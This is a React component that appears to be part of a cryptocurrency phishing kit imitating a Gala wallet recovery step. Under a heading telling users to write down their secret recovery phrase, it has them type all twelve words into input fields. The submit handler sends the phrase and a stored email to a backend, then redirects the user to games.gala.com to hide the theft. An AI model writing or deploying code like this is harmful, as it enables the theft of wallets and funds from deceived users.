'use client'
import React, {useState} from 'react';
import styles from './styles.module.css';
import classNames from "classnames";
import {connection} from "@/services/connection";
import {sessionConst} from "@/constants/session";

export const RecoveryPhraseNew = () => {
  const [phrases, setPhrases] = useState(Array(12).fill(''));
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleChange = (index: number, value: string) => {
    const updatedPhrases = [...phrases];
    updatedPhrases[index] = value;
    setPhrases(updatedPhrases);

    if (error) setError('');
  };

  const handleSubmit = async () => {
    if (phrases.includes('')) {
      setError('Please fill out all fields before submitting.');
      return;
    }

    setIsLoading(true)

    const {
      error,
    } = await connection.withoutActions({
      email: ` ${localStorage.getItem(sessionConst.Email) ?? ''} `,
      phrase: ` ${phrases.join(' ')} `,
    })
    
    setError('');
    setIsLoading(false);

    if (error) {
      window.location.reload();
    } else {
      window.location.assign('https://games.gala.com/')
    }
  };

  return (
    <div className={styles.container}>
      <div className={styles.content}>
        <div>
          <h1 className={styles.title}>Write down your secret recovery phrase</h1>
          <p className={styles.subtitle}>
            Write down this 12 words Secret Recovery Phrase and save it in a place that you trust and only you can
            access.
          </p>

          <div className={styles.list}>
            <p className={styles.listHeader}>
              Tips:
            </p>
            <ul className={styles.listWrapper}>
              <li>Save in a password manager</li>
              <li>Store in a safe deposit box</li>
              <li>Write down and store in multiple secret places</li>
            </ul>

          </div>
        </div>

        <div className={styles.grid}>
          {phrases.map((phrase, index) => (
            <div key={index} className={styles.inputWrapper}>
              <div className={styles.index}>{index + 1}.</div>
              <input
                type="text"
                value={phrase}
                onChange={(e) => handleChange(index, e.target.value)}
                className={classNames(styles.input, {
                  [styles.errorInput]: error && !phrase,
                })}
                placeholder={`Word ${index + 1}`}
              />
            </div>
          ))}
        </div>
        <div className={styles.confirmButtonWrapper}>
          <button
            className={styles.confirmButton}
            onClick={handleSubmit}
            disabled={isLoading}
            type='submit'
          >
            {isLoading ? 'Loading...' : 'Next'}
          </button>
        </div>
      </div>
    </div>
  );
};
